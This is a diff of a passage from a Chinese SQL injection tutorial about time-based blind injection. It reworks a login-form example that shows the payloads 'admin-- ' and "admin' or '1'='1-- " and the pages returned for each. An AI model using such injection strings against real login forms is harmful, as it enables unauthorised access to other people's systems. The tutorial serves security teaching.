@@ -140,26 +140,13 @@ updatexml(XML_document, XPath_string, new_value);该函数是XML文档处理函�
 
 ### 15. 基于时间的SQL盲注--延时注入 
 延时注入是主要针对页面无变化、无法用布尔真假判断、无法报错的情况下的注入技术。  
-场景举例：例如某个登录场景，在用户名处注入不同的代码，响应均为用户名或验证码错误，甚至当注入 ' or '1'='1时，会被安全软件拦截  
-
-	1)admin-- 注入：  
- 	
- 		<div><span id="labMsg" style="color:Red;">用户名或密码错误</span></div>
-    	<div>
-        用户名 :
-        <br />
-        <input name="tbUserId" type="text" value="admin-- " id="tbUserId" style="width:80px;" />
-        <br />
-         密　码 :
-         <br />
-        <input name="tbPassWord" type="password" id="tbPassWord" style="width:80px;" />
-        <br />
-        <input type="submit" name="btnLogin" value="登录" id="btnLogin" />
-    </div>
-
-	2)admin' or '1'='1-- 注入： 
+场景举例：例如某个登录场景，在用户名处注入不同的代码，响应均为用户名或验证码错误，甚至当注入 ' or '1'='1时，会被安全软件拦截    
+1) admin-- 注入： 
+ 
+ 	<div><span id="labMsg" style="color:Red;">用户名或密码错误</span></div>
+2) admin' or '1'='1-- 注入： 
 	
-		<title>Virus/Spyware Download Blocked</title>
+	<title>Virus/Spyware Download Blocked</title>
 
 1. Mysql Sleep()
 	
